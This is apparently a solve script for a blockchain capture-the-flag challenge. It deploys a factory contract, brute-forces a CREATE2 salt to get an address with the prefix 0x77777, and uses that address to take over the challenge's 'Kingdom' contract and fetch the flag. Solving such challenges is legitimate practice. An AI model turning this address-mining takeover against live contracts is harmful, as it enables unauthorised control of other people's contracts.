#!/usr/bin/env python3
import itertools
import json
import os
import subprocess
import sys
import time
from pathlib import Path

from eth_hash.auto import keccak
from foundpy import config
from web3 import Web3


LAUNCHER_URL = os.environ.get("LAUNCHER_URL", "http://localhost:48334/")
PREFIX_BITS = 20
PURE_SOUL_PREFIX = 0x77777

SETUP_ABI = [
    {
        "type": "function",
        "name": "TARGET",
        "inputs": [],
        "outputs": [{"name": "", "type": "address"}],
        "stateMutability": "view",
    },
    {
        "type": "function",
        "name": "isSolved",
        "inputs": [],
        "outputs": [{"name": "", "type": "bool"}],
        "stateMutability": "view",
    },
]

KINGDOM_ABI = [
    {
        "type": "function",
        "name": "trueHero",
        "inputs": [],
        "outputs": [{"name": "", "type": "address"}],
        "stateMutability": "view",
    },
    {
        "type": "function",
        "name": "registerAtGuild",
        "inputs": [{"name": "soul", "type": "address"}],
        "outputs": [],
        "stateMutability": "nonpayable",
    },
    {
        "type": "function",
        "name": "castGrandMagic",
        "inputs": [],
        "outputs": [],
        "stateMutability": "nonpayable",
    },
]


def connect():
    rpc_url = os.environ.get("RPC_URL") or os.environ.get("ETH_RPC_URL")
    privkey = os.environ.get("PRIVKEY") or os.environ.get("PRIVATE_KEY")
    setup_addr = os.environ.get("SETUP_CONTRACT_ADDR") or os.environ.get("SETUP_ADDR")

    if rpc_url and privkey and setup_addr:
        config.setup(rpc_url=rpc_url, privkey=privkey)
        return setup_addr, None

    launcher_url = sys.argv[1] if len(sys.argv) > 1 else LAUNCHER_URL
    data = config.from_tcp1p(launcher_url)
    return data["setup_contract"], config.flag


def compile_contracts():
    result = subprocess.run(
        ["forge", "build"],
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    if result.returncode != 0:
        print(result.stdout, end="")
        print(result.stderr, end="")
        result.check_returncode()
    factory = json.loads(
        Path("out/SummoningFactory.sol/SummoningFactory.json").read_text()
    )
    soul = json.loads(
        Path("out/StandardAdventurer.sol/StandardAdventurer.json").read_text()
    )
    return {
        "factory_abi": factory["abi"],
        "factory_bytecode": factory["bytecode"]["object"],
        "soul_creation": bytes.fromhex(soul["bytecode"]["object"].removeprefix("0x")),
        "soul_runtime": bytes.fromhex(
            soul["deployedBytecode"]["object"].removeprefix("0x")
        ),
    }


def build_base_tx(w3: Web3) -> dict:
    return {
        "from": config.wallet.address,
        "nonce": w3.eth.get_transaction_count(config.wallet.address),
        "gas": 1_500_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": w3.eth.chain_id,
    }


def send_built_tx(w3: Web3, tx: dict):
    tx.setdefault("from", config.wallet.address)
    if "gas" not in tx:
        tx["gas"] = w3.eth.estimate_gas(tx)
    signed = w3.eth.account.sign_transaction(tx, config.privkey)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)


def deploy_factory(w3: Web3, abi, bytecode):
    factory = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx = factory.constructor().build_transaction(build_base_tx(w3))
    receipt = send_built_tx(w3, tx)
    return w3.eth.contract(address=receipt.contractAddress, abi=abi)


def create2_address(factory_addr: str, salt: bytes, init_code_hash: bytes) -> str:
    digest = keccak(
        b"\xff" + bytes.fromhex(factory_addr[2:]) + salt + init_code_hash
    )
    return Web3.to_checksum_address(digest[-20:].hex())


def has_required_prefix(addr: str) -> bool:
    return int(addr, 16) >> (160 - PREFIX_BITS) == PURE_SOUL_PREFIX


def mine_salt(factory_addr: str, init_code_hash: bytes):
    started = time.time()
    create2_prefix = b"\xff" + bytes.fromhex(factory_addr[2:])
    for salt_int in itertools.count():
        salt = salt_int.to_bytes(32, "big")
        digest = keccak(create2_prefix + salt + init_code_hash)
        addr_bytes = digest[-20:]
        if (
            addr_bytes[0] == 0x77
            and addr_bytes[1] == 0x77
            and addr_bytes[2] >> 4 == 0x7
        ):
            addr = Web3.to_checksum_address(addr_bytes.hex())
            elapsed = time.time() - started
            print(f"mined salt = {salt_int} in {elapsed:.2f}s", flush=True)
            return salt, addr
        if salt_int and salt_int % 250000 == 0:
            print(f"searched {salt_int} salts...", flush=True)


def send_contract_tx(w3: Web3, fn):
    tx = fn.build_transaction(build_base_tx(w3))
    return send_built_tx(w3, tx)


def main():
    setup_addr, flag_fn = connect()
    w3 = config.w3

    compiled = compile_contracts()
    expected_hash = Web3.keccak(compiled["soul_runtime"]).hex()
    print(f"approved soul hash = 0x{expected_hash}")

    setup = w3.eth.contract(address=Web3.to_checksum_address(setup_addr), abi=SETUP_ABI)
    target_addr = Web3.to_checksum_address(setup.functions.TARGET().call())
    kingdom = w3.eth.contract(address=target_addr, abi=KINGDOM_ABI)

    print(f"setup  = {setup.address}")
    print(f"target = {target_addr}")
    print(f"before trueHero = {kingdom.functions.trueHero().call()}")

    factory = deploy_factory(
        w3,
        compiled["factory_abi"],
        compiled["factory_bytecode"],
    )
    print(f"factory = {factory.address}")

    init_code_hash = Web3.keccak(compiled["soul_creation"])
    salt, soul_addr = mine_salt(factory.address, init_code_hash)
    print(f"soul    = {soul_addr}")

    send_contract_tx(w3, factory.functions.summon(salt))
    send_contract_tx(w3, kingdom.functions.registerAtGuild(soul_addr))
    send_contract_tx(w3, kingdom.functions.castGrandMagic())

    print(f"after trueHero  = {kingdom.functions.trueHero().call()}")
    print(f"isSolved = {setup.functions.isSolved().call()}")

    if flag_fn is not None:
        print(f"flag            = {flag_fn()}")


if __name__ == "__main__":
    main()
